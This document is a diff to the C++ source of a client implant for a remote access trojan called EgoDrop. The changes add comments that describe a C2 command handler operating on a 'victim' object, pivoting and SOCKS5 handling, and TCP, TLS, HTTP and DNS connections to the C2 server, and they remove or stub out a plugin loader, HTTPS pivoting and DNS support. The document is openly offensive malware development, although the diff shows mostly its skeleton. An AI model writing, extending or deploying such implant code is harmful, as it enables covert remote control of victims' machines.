@@ -1,7 +1,8 @@
 /*
+Name: EgoDrop's client.
 Author: ISSAC
 
-Introduction: Implant(RAT's client).
+Introduction: RAT's client.
 */
 
 #include <iostream>
@@ -67,6 +68,9 @@ std::mutex g_mtxSocks5;
 
 std::unordered_map<int, std::shared_ptr<clsLtn>> g_mapLtn;
 
+/// @brief C2 command handler.
+/// @param victim Victim class object.
+/// @param vuMsg C2 message in list.
 void fnRecvCommand(std::shared_ptr<clsVictim> victim, const std::vector<std::string>& vuMsg)
 {
     try
@@ -488,10 +492,6 @@ void fnRecvCommand(std::shared_ptr<clsVictim> victim, const std::vector<std::str
 
             }
         }
-        else if (vsMsg[0] == "loader") //Plugin Loader.
-        {
-
-        }
         else if (vsMsg[0] == "server") //Pivoting.
         {
             if (vsMsg[1] == "ls")
@@ -568,11 +568,7 @@ void fnRecvCommand(std::shared_ptr<clsVictim> victim, const std::vector<std::str
                 }
                 else if (vsMsg[2] == "HTTP")
                 {
-
-                }
-                else if (vsMsg[2] == "HTTPS")
-                {
-                    
+                    //todo
                 }
 
                 STRLIST ls = {
@@ -812,6 +808,8 @@ void fnRecvCommand(std::shared_ptr<clsVictim> victim, const std::vector<std::str
 
 #pragma region Connection Handler
 
+/// @brief Network stream handler for TCP method.
+/// @param sktSrv 
 void fnTcpHandler(int sktSrv)
 {
     clsTools::fnLogInfo("Starting session...");
@@ -925,6 +923,8 @@ void fnTcpHandler(int sktSrv)
     return;
 }
 
+/// @brief Network stream handler for HTTP method.
+/// @param sktSrv 
 void fnHttpHandler(int sktSrv)
 {
     clsTools::fnLogInfo("Starting session...");
@@ -1025,6 +1025,9 @@ void fnHttpHandler(int sktSrv)
     return;
 }
 
+/// @brief Network stream handler for TLS method.
+/// @param nSktSrv 
+/// @param ssl 
 void fnTlsHandler(int nSktSrv, SSL* ssl)
 {
     clsTools::fnLogInfo("Starting session...");
@@ -1091,6 +1094,9 @@ void fnTlsHandler(int nSktSrv, SSL* ssl)
 
 #pragma region Connection
 
+/// @brief Connect to the C2 server via TCP method.
+/// @param szIP 
+/// @param nPort 
 void fnTcpConnect(std::string& szIP, int nPort)
 {
     try
@@ -1118,6 +1124,9 @@ void fnTcpConnect(std::string& szIP, int nPort)
     return;
 }
 
+/// @brief Connect to the C2 server via TLS method.
+/// @param szIP 
+/// @param nPort 
 void fnTlsConnect(std::string& szIP, int nPort)
 {
     SSL_library_init();
@@ -1154,6 +1163,9 @@ void fnTlsConnect(std::string& szIP, int nPort)
     return;
 }
 
+/// @brief Connect to the C2 server via HTTP method.
+/// @param szIP 
+/// @param nPort 
 void fnHttpConnect(std::string& szIP, int nPort)
 {
     int sktSrv = socket(AF_INET, SOCK_STREAM, 0);
@@ -1176,10 +1188,11 @@ void fnHttpConnect(std::string& szIP, int nPort)
     return;
 }
 
-void fnDnsConnect(std::string& szIP, int nPort)
+/// @brief Connect to the C2 server via DNS method.
+/// @param szDomain 
+void fnDnsConnect(std::string& szDomain)
 {
-
-
+    //todo
 }
 
 #pragma endregion
@@ -1233,9 +1246,6 @@ int main(int argc, char *argv[])
                 break;
             case enConnectionMethod::HTTP:
                 fnHttpConnect(g_szIP, g_nPort);
-                break;
-            case enConnectionMethod::DNS:
-                fnDnsConnect(g_szIP, g_nPort);
                 break;
             default:
                 fnTcpConnect(g_szIP, g_nPort);
